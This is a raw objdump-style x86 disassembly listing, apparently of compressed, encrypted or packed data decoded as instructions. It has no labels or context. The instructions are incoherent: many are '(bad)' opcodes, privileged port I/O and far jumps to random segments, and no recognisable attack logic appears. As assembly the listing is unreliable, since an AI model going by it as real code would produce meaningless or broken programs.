  41184b:	call   0xfe9b:0x3b6a195f
  411852:	sub    DWORD PTR [ebp+0x30],eax
  411855:	(bad)  
  411856:	fimul  DWORD PTR [esp+edi*8+0x1d]
  41185a:	ds mov dl,0xa1
  41185d:	push   es
  41185e:	cli    
  41185f:	scas   al,BYTE PTR es:[edi]
  411860:	sahf   
  411861:	aaa    
  411862:	lds    esp,FWORD PTR [esi+ebp*8+0x6a0960f0]
  411869:	adc    esi,DWORD PTR [ebp-0x46]
  41186c:	add    DWORD PTR [ecx],0xffffffbb
  41186f:	sbb    al,0x8a
  411871:	cwde   
  411872:	out    dx,eax
  411873:	and    DWORD PTR [eax+ebx*1+0x7ca046eb],esp
  41187a:	xchg   DWORD PTR [ebp-0x191af2a1],eax
  411880:	js     0x4118f6
  411882:	add    edx,DWORD PTR [esi-0x6e]
  411885:	rcl    DWORD PTR [ecx+0xe0dcda9],0xf2
  41188c:	adc    al,0x3
  41188e:	cld    
  41188f:	fs xor eax,0xd5b0fa1f
  411895:	lahf   
  411896:	fist   WORD PTR [ecx+0xae2c1f]
  41189c:	call   0x6092:0xf8418da1
  4118a3:	or     bh,BYTE PTR [esi+0x5476e294]
  4118a9:	xor    BYTE PTR [esi+0x67280fce],bh
  4118af:	repz or BYTE PTR [esi+eiz*4+0x61],dh
  4118b4:	sub    eax,0x27d983e3
  4118b9:	shl    DWORD PTR [ebx],1
  4118bb:	pop    edx
  4118bc:	jnp    0x411841
  4118be:	cwde   
  4118bf:	out    dx,eax
  4118c0:	adc    ecx,DWORD PTR [ebx-0x2c6e1b9e]
  4118c6:	mov    cl,BYTE PTR [edi-0x67a414ca]
  4118cc:	sub    BYTE PTR [ebp-0x781467a5],dh
  4118d2:	mov    esp,0x3e298286
  4118d7:	pop    ds
  4118d8:	jo     0x4118d6
  4118da:	jmp    0x993c3bb1
  4118df:	dec    edi
  4118e0:	leave  
  4118e1:	xchg   edi,eax
  4118e2:	call   0xfcd735c3
  4118e7:	mov    al,0x14
  4118e9:	or     BYTE PTR [eax+0x60],0xb1
  4118ed:	jns    0x4118b3
  4118ef:	add    al,0x3e
  4118f1:	call   ecx
  4118f3:	sti    
  4118f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118f5:	adc    ecx,ebp
  4118f7:	cdq    
  4118f8:	push   eax
  4118f9:	outs   dx,DWORD PTR ds:[esi]
  4118fa:	sub    BYTE PTR [edi+0x4aaf2b7],0xd8
  411901:	or     DWORD PTR [esi-0x3b33910],edi
  411907:	lods   al,BYTE PTR ds:[esi]
  411908:	pop    ss
  411909:	shl    DWORD PTR [eax+0x1f],0x8
  41190d:	loopne 0x41197e
  41190f:	xchg   edi,eax
  411910:	daa    
  411911:	sbb    ecx,DWORD PTR [ecx]
  411913:	push   edi
  411914:	(bad)  
  411915:	retf   0x5618
  411918:	ja     0x4118ae
  41191a:	push   ecx
  41191b:	adc    esp,DWORD PTR [ebp+0x63110fd9]
  411921:	stos   DWORD PTR es:[edi],eax
  411922:	xchg   esi,eax
  411923:	jl     0x411918
  411925:	add    dh,dl
  411927:	xor    dl,dh
  411929:	jge    0x41194c
  41192b:	jecxz  0x411922
  41192d:	aas    
  41192e:	popa   
  41192f:	push   es
  411930:	jb     0x411947
  411932:	add    al,0x1
  411934:	out    0xce,eax
  411936:	xlat   BYTE PTR ds:[ebx]
  411937:	pop    ebx
  411938:	(bad)  
  411939:	cmc    
  41193a:	mov    ebp,0xdb19e6b0
  41193f:	pop    edx
  411940:	sahf   
  411941:	or     al,BYTE PTR [edi-0x7f]
  411944:	sub    al,0xc3
  411946:	add    DWORD PTR [esi],0x0
  411949:	loop   0x4118eb
  41194b:	retf   
  41194c:	(bad)  
  41194d:	jbe    0x4119ab
  41194f:	in     eax,dx
  411950:	mov    ebp,0x5afa40
  411955:	cli    
  411956:	sbb    edx,DWORD PTR [ecx+0x67]
  411959:	sbb    eax,ecx
  41195b:	add    BYTE PTR [ebp+0x65],dh
  41195e:	out    0x21,eax
  411960:	jge    0x4119cb
  411962:	sbb    al,0x6
  411964:	jg     0x41190f
  411966:	push   eax
  411967:	mov    esp,0x67c6477d
  41196c:	(bad)  
  41196d:	adc    DWORD PTR fs:[eax-0x6f],ebp
  411971:	out    0xc4,eax
  411973:	fisub  DWORD PTR [ebp-0x7b1cded6]
  411979:	and    eax,0x6b48ab70
  41197e:	ja     0x411948
  411980:	aas    
  411981:	xchg   DWORD PTR [edx-0xe],esp
  411984:	jmp    0x7d81:0xcb7c89f7
  41198b:	test   al,0x7e
  41198d:	jecxz  0x4119d7
  41198f:	mov    dh,0x1e
  411991:	loope  0x4119d6
  411993:	retf   0x6a46
  411996:	dec    ecx
  411997:	aam    0x58
  411999:	clc    
  41199a:	shr    BYTE PTR [ebx-0x7a994843],0x2d
  4119a1:	enter  0xbe84,0x7
  4119a5:	and    ecx,DWORD PTR [eax]
  4119a7:	outs   dx,DWORD PTR ds:[esi]
  4119a8:	ret    
  4119a9:	clc    
  4119aa:	mov    cx,0x4319
  4119ae:	test   dh,bl
  4119b0:	adc    bl,BYTE PTR [ecx+0xb]
  4119b3:	pop    edx
  4119b4:	das    
  4119b5:	jle    0x4119c5
  4119b7:	arpl   bp,si
  4119b9:	das    
  4119ba:	jb     0x4119c2
  4119bc:	(bad)  
  4119bd:	push   esp
  4119be:	xchg   edx,eax
  4119bf:	and    al,0xde
  4119c1:	inc    esi
  4119c2:	xchg   edi,eax
  4119c3:	loop   0x41196c
  4119c5:	fidiv  DWORD PTR [edx-0x54]
  4119c8:	sbb    edi,eax
  4119ca:	push   ebp
  4119cb:	je     0x4119be
  4119cd:	cwde   
  4119ce:	xor    DWORD PTR [eax-0xda087e2],0xffffffea
  4119d5:	cwde   
  4119d6:	loopne 0x41197c
  4119d8:	pop    ecx
  4119d9:	sbb    DWORD PTR [edi-0x2be7dcee],esp
  4119df:	out    0x38,eax
  4119e1:	xchg   edx,eax
  4119e2:	xchg   DWORD PTR ds:0xc1423d57,ecx
  4119e8:	or     edi,ebx
  4119ea:	arpl   WORD PTR [esi+0x8],ax
  4119ed:	(bad)  
  4119ee:	xor    esi,DWORD PTR [ebx-0x13e94e83]
  4119f4:	test   al,0x61
  4119f6:	test   BYTE PTR [eax-0x376d1fe7],0x4a
  4119fd:	fistp  QWORD PTR [edi+0x10]
  411a00:	fmul   QWORD PTR [edi+0x56204ae5]
  411a06:	fcomp  DWORD PTR [eax-0x1f]
  411a09:	dec    edi
  411a0a:	int3   
  411a0b:	xor    eax,ebx
  411a0d:	fistp  DWORD PTR [edx+0x306b6939]
  411a13:	push   0x3c
  411a15:	push   cs
  411a16:	push   edi
  411a17:	cmp    BYTE PTR [edx+eax*8],0xd7
  411a1b:	icebp  
  411a1c:	push   ds
  411a1d:	dec    ecx
  411a1e:	mov    bl,0x3f
  411a20:	xchg   ecx,eax
  411a21:	cmp    al,ch
  411a23:	xor    ebp,DWORD PTR [edi+esi*1]
  411a26:	xor    ebx,DWORD PTR [edx]
  411a28:	and    ch,BYTE PTR [ecx]
  411a2a:	leave  
  411a2b:	enter  0x528a,0x19
  411a2f:	out    dx,eax
  411a30:	sbb    edi,edi
  411a32:	inc    edi
  411a33:	jb     0x4119fc
  411a35:	lods   eax,DWORD PTR ds:[esi]
  411a36:	xchg   ebp,eax
  411a37:	(bad)  
  411a38:	aad    0x6d
  411a3a:	nop
  411a3b:	mov    ebp,0x76a3dc45
  411a40:	loopne 0x411a37
  411a42:	inc    ecx
  411a43:	cmp    al,0x1f
  411a45:	inc    edi
  411a46:	pop    edi
  411a47:	xchg   ebp,eax
  411a48:	jp     0x411a8f
  411a4a:	imul   esi,DWORD PTR [esi],0x59885bef
  411a50:	test   al,0xa7
  411a52:	inc    esp
  411a53:	aam    0x3b
  411a55:	jae    0x411a97
  411a57:	out    0xf,eax
  411a59:	adc    BYTE PTR [eax-0x3fda5691],ah
  411a5f:	add    BYTE PTR [edx+0x4b],0x7c
  411a63:	jns    0x411a8c
  411a65:	add    dl,BYTE PTR [ebx]
  411a67:	(bad)  
  411a69:	pop    ebp
  411a6a:	sti    
  411a6b:	stos   DWORD PTR es:[edi],eax
  411a6c:	mov    al,ds:0xbf32fdfb
  411a71:	mov    eax,ds:0xebe28b96
  411a76:	xlat   BYTE PTR ds:[ebx]
  411a77:	pop    ds
  411a78:	xchg   ebp,eax
  411a79:	inc    ebp
  411a7a:	xlat   BYTE PTR ds:[ebx]
  411a7b:	mov    ch,0x14
  411a7d:	loop   0x411a59
  411a7f:	inc    BYTE PTR [ecx-0x36ed8575]
  411a85:	sahf   
  411a86:	lahf   
  411a87:	mov    ah,0xb0
  411a89:	in     al,0x3d
  411a8b:	outs   dx,BYTE PTR ds:[esi]
  411a8c:	adc    ebp,ebx
  411a8e:	mov    cl,0x1b
  411a90:	add    al,0x22
  411a92:	sar    DWORD PTR [edx],0xc6
  411a95:	add    eax,0x96498ea
  411a9a:	push   cs
  411a9b:	jno    0x411a87
  411a9d:	ret    0xa0ce
  411aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aa1:	aaa    
  411aa2:	sbb    DWORD PTR ds:[eax+ebp*2+0x28],0x6f
  411aa8:	ror    BYTE PTR [ebp-0x5c800e2b],1
  411aae:	(bad)  
  411aaf:	sub    al,0x5a
  411ab1:	std    
  411ab2:	jmp    DWORD PTR [edi+edx*8-0x7c]
  411ab6:	icebp  
  411ab7:	pusha  
  411ab8:	jp     0x411a9f
  411aba:	loopne 0x411a41
  411abc:	inc    esp
  411abd:	ss push ds
  411abf:	cmp    eax,0xc2df441c
  411ac4:	pop    eax
  411ac5:	push   0x7b
  411ac7:	jns    0x411ae5
  411ac9:	xor    bl,BYTE PTR [eax+eiz*8]
  411acc:	and    BYTE PTR [ebx+0x42],al
  411acf:	jg     0x411a70
  411ad1:	call   0xc287a371
  411ad6:	cmp    BYTE PTR [ebx],0xc1
  411ad9:	add    al,0x57
  411adb:	or     DWORD PTR [ebx+0x544da590],ebx
  411ae1:	jo     0x411afb
  411ae3:	push   cs
  411ae4:	gs retf 
  411ae6:	lods   al,BYTE PTR ds:[esi]
  411ae7:	out    0x8e,al
  411ae9:	int3   
  411aea:	out    dx,al
  411aeb:	xchg   edx,eax
  411aec:	jle    0x411b0b
  411aee:	(bad)  
  411aef:	fsub   QWORD PTR [esi]
  411af1:	sbb    BYTE PTR ds:0x40765cb,cl
  411af7:	pusha  
  411af8:	mov    ah,al
  411afa:	adc    al,0xbb
  411afc:	dec    ebp
  411afd:	mov    eax,ds:0x31e32c49
  411b02:	push   ds
  411b03:	adc    ebx,edx
  411b05:	call   0xf3df:0x6e55ea05
  411b0c:	loop   0x411b4d
  411b0e:	ror    bh,1
  411b10:	ret    
  411b11:	adc    ah,BYTE PTR [eax]
  411b13:	ja     0x411b93
  411b15:	mov    cs,WORD PTR [eax-0x3e33f0e0]
  411b1b:	sbb    cl,BYTE PTR [ebx-0x5c5b5259]
  411b21:	push   0xfe5d57b7
  411b26:	xor    ch,BYTE PTR [ebp-0x13]
  411b29:	js     0x411ac8
  411b2b:	outs   dx,BYTE PTR ds:[esi]
  411b2c:	add    eax,DWORD PTR [edi]
  411b2e:	xlat   BYTE PTR ds:[ebx]
  411b2f:	adc    DWORD PTR [ecx+0x4aebb157],ecx
  411b35:	add    eax,0xf2ff13e2
  411b3a:	adc    eax,0xa0231aa4
  411b3f:	and    esp,DWORD PTR [edi+0x3e]
  411b42:	jmp    0x714d45bd
  411b47:	jle    0x411b85
  411b49:	(bad)  
  411b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b4b:	or     BYTE PTR [edx-0x16],dh
  411b4e:	jmp    0x411af4
  411b50:	pop    ebp
  411b51:	stos   DWORD PTR es:[edi],eax
  411b52:	sbb    al,0x8
  411b54:	cs (bad) 
  411b56:	inc    ebx
  411b57:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b59:	mov    edi,DWORD PTR [ecx]
  411b5b:	or     BYTE PTR [ecx],cl
  411b5d:	test   BYTE PTR [eax+0x37a24800],ch
  411b63:	jl     0x411b09
  411b65:	outs   dx,DWORD PTR ds:[esi]
  411b66:	std    
  411b67:	cld    
  411b68:	mov    esp,0x1aa72a69
  411b6d:	inc    edi
  411b6e:	dec    ebp
  411b6f:	and    DWORD PTR [edi-0x73d5e216],eax
  411b75:	sub    edi,esi
  411b77:	jbe    0x411beb
  411b79:	or     DWORD PTR [eax+0x24a72642],eax
  411b7f:	add    al,BYTE PTR [eax-0x14]
  411b82:	push   es
  411b83:	retf   
  411b84:	push   cs
  411b85:	stos   DWORD PTR es:[edi],eax
  411b86:	jns    0x411b2d
  411b88:	push   esp
  411b89:	in     al,dx
  411b8a:	sub    eax,0x539dc2ac
  411b8f:	cmp    bl,BYTE PTR ds:0x8b95c683
  411b95:	je     0x411b98
  411b97:	leave  
  411b98:	pushf  
  411b99:	add    al,0x35
  411b9b:	lods   eax,DWORD PTR ds:[esi]
  411b9c:	mov    ebp,0x3a048d73
  411ba1:	adc    eax,0x87c5f627
  411ba6:	and    cl,al
  411ba8:	push   DWORD PTR ds:0xd3233b09
  411bae:	daa    
  411baf:	pop    edx
  411bb0:	pop    esi
  411bb1:	and    eax,0xe3f62bba
  411bb6:	push   ds
  411bb7:	mov    al,ds:0x3597a19d
  411bbc:	and    DWORD PTR [edx],edx
  411bbe:	mov    DWORD PTR [eax+0x4eed0cb0],0xc80d0bb5
  411bc8:	pop    edx
  411bc9:	inc    eax
  411bca:	mov    esi,DWORD PTR [edi+0x1ff90576]
  411bd0:	test   BYTE PTR [edi+0x3a],dh
  411bd3:	mov    bh,0xea
  411bd5:	push   ebx
  411bd6:	je     0x411c1c
  411bd8:	dec    ecx
  411bd9:	mov    edx,0xc8dea6c2
  411bde:	cdq    
  411bdf:	mov    ds:0x5ff51140,eax
  411be4:	push   esp
  411be5:	xor    BYTE PTR [edx+0x5a],dh
  411be8:	dec    ebp
  411be9:	add    ah,bl
  411beb:	ins    DWORD PTR es:[edi],dx
  411bec:	nop
  411bed:	test   BYTE PTR [ecx+0x3e30bf2e],al
  411bf3:	inc    esi
  411bf4:	fwait
  411bf5:	sbb    BYTE PTR [ebp-0x7a],bh
  411bf8:	dec    esi
  411bf9:	cmp    al,0x58
  411bfb:	push   0xd1fd46b4
  411c00:	xchg   edi,eax
  411c01:	sahf   
  411c02:	cwde   
  411c03:	cmp    cl,dl
  411c05:	mov    dl,0x7
  411c07:	fs xchg esi,eax
  411c09:	out    0xae,eax
  411c0b:	cmp    DWORD PTR [eax+0x4ffcfc60],ebx
  411c11:	in     eax,0x87
  411c13:	push   ss
  411c14:	sti    
  411c15:	jmp    0x411c43
  411c17:	dec    eax
  411c18:	pop    ss
  411c19:	loopne 0x411bcf
  411c1b:	int3   
  411c1c:	pop    esp
  411c1d:	sub    eax,0x17da526b
  411c22:	nop
  411c23:	xor    BYTE PTR [eax-0x6a],0x5a
  411c27:	ret    
  411c28:	je     0x411c9a
  411c2a:	outs   dx,BYTE PTR cs:[esi]
  411c2c:	cmp    edx,eax
  411c2e:	xchg   DWORD PTR [ebx],esp
  411c30:	inc    ebx
  411c31:	sub    esp,0x59f1dde5
  411c37:	push   ds
  411c38:	xchg   esp,eax
  411c39:	mov    bl,BYTE PTR [ecx+0x30]
  411c3c:	cwde   
  411c3d:	and    ebx,ebx
  411c3f:	loope  0x411cb4
  411c41:	stos   BYTE PTR es:[edi],al
  411c42:	mov    al,ds:0xa91f03d8
  411c47:	xchg   cl,al
  411c49:	fisttp WORD PTR [esi*8+0x1a632684]
  411c50:	pop    eax
  411c51:	mov    edx,0x7438845a
  411c56:	push   edi
  411c57:	xchg   esi,eax
  411c58:	sahf   
  411c59:	jge    0x411c9e
  411c5b:	mov    ah,0x28
  411c5d:	or     eax,0x913c6ffa
  411c62:	out    0x6b,al
  411c64:	mov    edx,0x6f9e6d14
  411c69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c6a:	(bad)  
  411c6b:	xor    al,0x54
  411c6d:	ret    0x44ac
  411c70:	jecxz  0x411c13
  411c72:	xchg   ebx,eax
  411c73:	fistp  QWORD PTR [ebp-0x71]
  411c76:	popa   
  411c77:	dec    esi
  411c78:	repz inc ecx
  411c7a:	loope  0x411c73
  411c7c:	add    al,BYTE PTR [ebp-0x6a]
  411c7f:	push   ss
  411c80:	ds das 
  411c82:	hlt    
  411c83:	mov    eax,DWORD PTR [edi+0x51]
  411c86:	scas   al,BYTE PTR es:[edi]
  411c87:	push   ebx
  411c88:	jge    0x411c1e
  411c8a:	(bad)  
  411c8b:	in     eax,0xcb
  411c8d:	cdq    
  411c8e:	mov    ecx,0x9fbb557
  411c93:	jb     0x411c97
  411c95:	arpl   WORD PTR [eax+0x6afd9a55],sp
  411c9b:	mov    al,0x9e
  411c9d:	bnd jne 0x411cba
  411ca0:	push   edx
  411ca1:	xchg   esi,eax
  411ca2:	add    BYTE PTR ds:0x6ac2f0af,dh
  411ca8:	into   
  411ca9:	push   ebx
  411caa:	push   ds
  411cab:	ret    
  411cac:	fldz   
  411cae:	and    esi,DWORD PTR [ebp+ecx*2-0x31430088]
  411cb5:	pusha  
  411cb6:	fs repz jb 0x411ce9
  411cba:	bound  ebx,QWORD PTR [eax]
  411cbc:	dec    edi
  411cbd:	test   BYTE PTR [edx-0x73],bh
  411cc0:	add    bl,dl
  411cc2:	aad    0xf2
  411cc4:	cmc    
  411cc5:	mov    edi,0xadecfbb9
  411cca:	jp     0x411c68
  411ccc:	dec    esp
  411ccd:	sub    edx,edi
  411ccf:	mov    ecx,0xc7a46991
  411cd4:	lds    eax,FWORD PTR [edi]
  411cd6:	push   ebp
  411cd7:	mov    ds:0x2eb0b578,eax
  411cdc:	jecxz  0x411ce7
  411cde:	xchg   BYTE PTR [ebp-0x6d],cl
  411ce1:	fbstp  TBYTE PTR [ebp+edx*1-0x2d]
  411ce5:	or     edi,DWORD PTR [esi+0x269e2d1b]
  411ceb:	dec    ebx
  411cec:	dec    ebp
  411ced:	xchg   edi,eax
  411cee:	ret    
  411cef:	or     esi,DWORD PTR [edi+0x23]
  411cf2:	mov    edi,0x1301fd1
  411cf7:	sub    ebp,DWORD PTR [edx+esi*1+0xe]
  411cfb:	js     0x411c91
  411cfd:	nop
  411cfe:	inc    eax
  411cff:	out    0x9d,eax
  411d01:	cld    
  411d02:	int3   
  411d03:	test   al,0x52
  411d05:	mov    ebx,eax
  411d07:	push   0xffffffd6
  411d09:	inc    edi
  411d0a:	stos   DWORD PTR es:[edi],eax
  411d0b:	or     BYTE PTR [eax+0x2],ch
  411d0e:	cmp    ecx,ebx
  411d10:	js     0x411d56
  411d12:	je     0x411d56
  411d14:	xor    DWORD PTR [esi-0x72745b66],ebx
  411d1a:	push   ecx
  411d1b:	paddsw mm1,mm7
  411d1e:	dec    esi
  411d1f:	imul   esp,ebp,0x28
  411d22:	dec    ecx
  411d23:	jae    0x411cb9
  411d25:	sbb    BYTE PTR [ebx-0x8a694d9],dl
  411d2b:	pushf  
  411d2c:	add    al,0x29
  411d2e:	and    al,cl
  411d30:	sbb    eax,0x208ef77a
  411d35:	loopne 0x411d04
  411d37:	fld    TBYTE PTR [esi]
  411d39:	int3   
  411d3a:	xchg   edx,eax
  411d3b:	mov    al,ds:0x49662b83
  411d40:	les    eax,FWORD PTR [ebp-0x17c579bc]
  411d46:	clc    
  411d47:	addr16 add eax,0xd2dbd01b
  411d4d:	mov    ds:0x9a4e288e,eax
  411d52:	mov    ds:0x37962058,eax
  411d57:	mov    esp,0xd8ce3ad7
  411d5c:	cmc    
  411d5d:	mov    dh,0x26
  411d5f:	jp     0x411d7a
  411d61:	mov    al,ds:0x1f92c5b8
  411d66:	inc    ebp
  411d67:	xchg   edi,eax
  411d68:	inc    ebp
  411d69:	arpl   WORD PTR [ebx+0x8],dx
  411d6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d6d:	pop    eax
  411d6e:	jmp    FWORD PTR [edx-0xadc0b59]
  411d74:	pop    eax
  411d75:	pop    ebp
  411d76:	or     esp,esi
  411d78:	fcom   DWORD PTR [edi-0x5f]
  411d7b:	and    dl,BYTE PTR [ebx]
  411d7d:	scas   eax,DWORD PTR es:[edi]
  411d7e:	push   es
  411d7f:	jle    0x411d22
  411d81:	int    0x71
  411d83:	(bad)  
  411d84:	mov    esp,ebp
  411d86:	test   DWORD PTR [ecx+0x74],esp
  411d89:	aaa    
  411d8a:	in     al,0x75
  411d8c:	sub    DWORD PTR [edi],ebp
  411d8e:	xor    eax,0x2fece350
  411d93:	push   esp
  411d94:	or     DWORD PTR [ecx],0xc9bae0f2
  411d9a:	daa    
  411d9b:	imul   eax,DWORD PTR [ebx+eax*1-0x2e],0x4e
  411da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411da1:	mov    dl,0x26
  411da3:	test   al,0xea
  411da5:	add    eax,0x82a41e53
  411daa:	inc    ebp
  411dab:	call   0x6e5d:0xbbeb91c1
  411db2:	xor    bl,BYTE PTR [esi]
  411db4:	or     bl,BYTE PTR [esi+eiz*4+0x608c9d99]
  411dbb:	xor    BYTE PTR [edi],ah
  411dbd:	nop
  411dbe:	jmp    0x411e11
  411dc0:	cmp    ebx,eax
  411dc2:	and    al,0x3e
  411dc4:	(bad)  
  411dc6:	imul   ebx,DWORD PTR [ecx-0x4c13dfd7],0x8a0a20d5
  411dd0:	cmp    dl,dh
  411dd2:	jecxz  0x411db9
  411dd4:	or     eax,0xf1ce23fb
  411dd9:	ret    
  411dda:	clc    
  411ddb:	sbb    ecx,DWORD PTR [ecx-0x3a]
  411dde:	test   DWORD PTR [ebp-0x2d],ebp
  411de1:	lods   al,BYTE PTR ds:[esi]
  411de2:	fist   DWORD PTR [ebx+0x31ae38de]
  411de8:	mov    ebp,0xfb8f3c84
  411ded:	inc    eax
  411dee:	in     al,0xf1
  411df0:	mov    eax,DWORD PTR [ebp-0x10]
  411df3:	(bad)  
  411df4:	jo     0x411da9
  411df6:	cmp    DWORD PTR [edi+0x7d4536e6],edx
  411dfc:	sahf   
  411dfd:	sbb    eax,0x84589873
  411e02:	xchg   ebx,eax
  411e03:	inc    edx
  411e04:	fdivrp st(1),st
  411e06:	ins    BYTE PTR es:[edi],dx
  411e07:	fcom   DWORD PTR [edi+0x57787ea7]
  411e0d:	stos   DWORD PTR es:[edi],eax
  411e0e:	xchg   esp,eax
  411e0f:	inc    ecx
  411e10:	add    BYTE PTR ds:0xcbb2515,cl
  411e16:	in     eax,dx
  411e17:	fs fdiv st(3),st
  411e1a:	adc    BYTE PTR [ebx+esi*1-0x11d25a06],bl
  411e21:	jbe    0x411e71
  411e23:	sbb    eax,ebx
  411e25:	mov    ah,0xd8
  411e27:	(bad)  
  411e28:	ficomp DWORD PTR [eax-0x25]
  411e2b:	dec    ecx
  411e2c:	or     esi,DWORD PTR [edi]
  411e2e:	and    dh,ch
  411e30:	jg     0x411e04
  411e32:	mov    ebx,0x23f9c26
  411e37:	leave  
  411e38:	icebp  
  411e39:	xor    eax,0x3f9660a1
  411e3e:	lahf   
  411e3f:	mov    esi,DWORD PTR [edi+edi*1+0x37f28131]
  411e46:	shl    DWORD PTR [esi+ebx*8],cl
  411e49:	fist   DWORD PTR [eax-0x58]
  411e4c:	add    ebp,DWORD PTR [esp+edx*8]
  411e4f:	call   0xe2b4235f
  411e54:	and    bh,bl
  411e56:	mov    DWORD PTR [edi],ecx
  411e58:	ds cli 
  411e5a:	pop    ebp
  411e5b:	cmp    eax,0x620642b
  411e60:	stc    
  411e61:	int    0x7f
  411e63:	lods   eax,DWORD PTR ds:[esi]
  411e64:	xchg   ebp,eax
  411e65:	aam    0x22
  411e67:	shld   DWORD PTR [esi],edx,0x9b
  411e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e6c:	ins    DWORD PTR es:[edi],dx
  411e6d:	hlt    
  411e6e:	into   
  411e6f:	xchg   esi,eax
  411e70:	lods   al,BYTE PTR ds:[esi]
  411e71:	mov    edx,0xc85cbc5a
  411e76:	inc    ebp
  411e77:	fs sahf 
  411e79:	mov    edx,0xe931d11
  411e7e:	out    dx,al
  411e7f:	cmp    BYTE PTR gs:[ecx+ebx*8],ch
  411e83:	dec    esp
  411e84:	mov    ebp,0xc28d5c47
  411e89:	(bad)  
  411e8a:	cli    
  411e8b:	xchg   ebp,eax
  411e8c:	sbb    BYTE PTR [ebx],0xc8
  411e8f:	mov    eax,ds:0xf3209b1c
  411e94:	push   ds
  411e95:	cli    
  411e96:	jns    0x411e68
  411e98:	pop    es
  411e99:	mov    esp,0xf3d96f5f
  411e9e:	xchg   DWORD PTR [ecx],ebx
  411ea0:	lods   eax,DWORD PTR ds:[esi]
  411ea1:	xchg   ebx,eax
  411ea2:	retw   
  411ea4:	scas   eax,DWORD PTR es:[edi]
  411ea5:	mov    edi,DWORD PTR [ebp-0x4378a996]
  411eab:	popf   
  411eac:	aam    0xc9
  411eae:	push   0x8f4c692b
  411eb3:	popf   
  411eb4:	call   DWORD PTR [ecx]
  411eb6:	ja     0x411e47
  411eb8:	xor    al,0x3b
  411eba:	stos   DWORD PTR es:[edi],eax
  411ebb:	out    0xaa,eax
  411ebd:	imul   esi,DWORD PTR [esi],0x10227017
  411ec3:	out    dx,eax
  411ec4:	mov    esp,0x898aaecd
  411ec9:	pop    edx
  411eca:	xchg   ecx,eax
  411ecb:	pop    ss
  411ecc:	das    
  411ecd:	in     eax,dx
  411ece:	sti    
  411ecf:	cli    
  411ed0:	xor    bh,cl
  411ed2:	mov    DWORD PTR [ebp-0x2503463c],edi
  411ed8:	add    BYTE PTR [bx+0x67],ah
  411edc:	cdq    
  411edd:	add    eax,0x6cbe3645
  411ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ee3:	lods   eax,DWORD PTR ds:[esi]
  411ee4:	js     0x411efe
  411ee6:	stc    
  411ee7:	pusha  
  411ee8:	and    al,0xd6
  411eea:	pop    ebx
  411eeb:	fisub  DWORD PTR [eax-0x39]
  411eee:	mov    ch,0x6e
  411ef0:	xchg   esp,eax
  411ef1:	fwait
  411ef2:	in     eax,dx
  411ef3:	(bad)  
  411ef4:	popa   
  411ef5:	or     BYTE PTR [esi+0xc],0xce
  411ef9:	cli    
  411efa:	xchg   esp,eax
  411efb:	adc    eax,0x55c346e5
  411f00:	jne    0x411f5c
  411f02:	(bad)
  411f05:	xor    BYTE PTR [edx+eiz*8],0xcf
  411f09:	sbb    eax,0x337c956c
  411f0e:	test   eax,0x207482a1
  411f13:	adc    al,0xbf
  411f15:	or     BYTE PTR [edx],bl
  411f17:	cmp    ch,bl
  411f19:	test   eax,0xc2c4a2f0
  411f1e:	jo     0x411ea4
  411f20:	push   ss
  411f21:	mov    dh,0xc5
  411f23:	jge    0x411ead
  411f25:	les    eax,FWORD PTR [edx+0x77]
  411f28:	or     eax,eax
  411f2a:	imul   BYTE PTR [ecx]
  411f2c:	fwait
  411f2d:	iret   
  411f2e:	das    
  411f2f:	lods   eax,DWORD PTR ds:[esi]
  411f30:	or     esi,esi
  411f32:	pop    es
  411f33:	cdq    
  411f34:	jo     0x411eea
  411f36:	mov    dl,0x8d
  411f38:	cs mov dh,0x84
  411f3b:	pop    edi
  411f3c:	dec    edx
  411f3d:	leave  
  411f3e:	loop   0x411f56
  411f40:	lds    ebp,FWORD PTR [ebp-0x50]
  411f43:	test   al,0x82
  411f45:	xchg   ecx,eax
  411f47:	mov    edi,0xa0e3d722
  411f4c:	popa   
  411f4d:	aam    0x4c
  411f4f:	ficomp WORD PTR gs:[ecx+0x70]
  411f53:	sub    DWORD PTR [edi*8-0x3ffec211],edi
  411f5a:	in     al,dx
  411f5b:	inc    ebp
  411f5c:	pushf  
  411f5d:	(bad)  
  411f5e:	aaa    
  411f5f:	mov    ebx,0xd9113830
  411f64:	sub    al,0xf8
  411f66:	pop    ds
  411f67:	int3   
  411f68:	inc    ebx
  411f69:	sti    
  411f6a:	repz mov esi,0x8383ea85
  411f70:	pop    esp
  411f71:	xchg   edi,eax
  411f72:	icebp  
  411f73:	ret    0x12db
  411f76:	jmp    0x548d:0x9c133931
  411f7d:	(bad)  [ebx-0x1f]
  411f80:	jno    0x411f94
  411f82:	push   esp
  411f83:	push   ss
  411f84:	sub    esp,DWORD PTR [esi+0x89a815a]
  411f8a:	scas   eax,DWORD PTR es:[edi]
  411f8b:	xchg   edi,eax
  411f8c:	dec    eax
  411f8d:	cli    
  411f8e:	fist   WORD PTR [ebx+0x445dde37]
  411f94:	jmp    0x9950:0xfc2ad12
  411f9b:	loop   0x412007
  411f9d:	(bad)  
  411f9e:	lahf   
  411f9f:	or     DWORD PTR [eax],edx
  411fa1:	pop    edi
  411fa2:	push   edx
  411fa3:	sbb    BYTE PTR [ebx-0x80],cl
  411fa6:	and    eax,0xbeb1d0b7
  411fab:	test   DWORD PTR [ebx-0x39083cf4],eax
  411fb1:	jecxz  0x411f9c
  411fb3:	scas   eax,DWORD PTR es:[edi]
  411fb4:	adc    al,0xd4
  411fb6:	jg     0x411fa2
  411fb8:	inc    ebx
  411fb9:	cmp    DWORD PTR [edi+0xe],0xffffffcc
  411fbd:	rol    bh,cl
  411fbf:	clc    
  411fc0:	inc    edx
  411fc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fc2:	imul   ebx,DWORD PTR [eax+0x7ad44425],0x7f
  411fc9:	sub    DWORD PTR [edx+0x3e],0xffffffbe
  411fcd:	jae    0x411fce
  411fcf:	push   edx
  411fd0:	fwait
  411fd1:	test   DWORD PTR [ebp-0x2a],0x8d1419cf
  411fd8:	add    DWORD PTR [edi+0x2aff8a11],esi
